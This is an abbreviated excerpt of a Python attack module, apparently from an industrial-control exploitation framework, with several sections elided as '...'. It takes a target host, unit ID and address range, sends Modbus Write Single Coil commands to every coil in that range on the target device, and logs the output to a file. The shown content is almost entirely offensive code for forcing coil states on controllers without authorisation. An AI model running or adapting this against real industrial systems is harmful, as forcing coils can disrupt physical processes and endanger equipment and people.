...
class Module:
    ...
    options = {
        ...
        'EndAddress': ['0xffff', True, 'The End address'],
    ...
    def exploit(self):
        ...
        if self.options['Output'][0]:
            open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOSTS'][0].replace('/', '_') + '.txt',
                 'a').write('=' * 30 + '\n' + self.output + '\n\n')
        self.output = ''
    ...
    def do(self, ip):
        for i in range(int(self.options['StartAddress'][0], 16),int(self.options['EndAddress'][0],16) + 1):
            ...
            ans = c.sr1(
                ModbusADU(transId=getTransId(), unitId=int(self.options['UID'][0])) / ModbusPDU05_Write_Single_Coil(
                    outputAddr=int(hex(i), 16),
                    outputValue=int(self.options['OutputValue'][0], 16)),
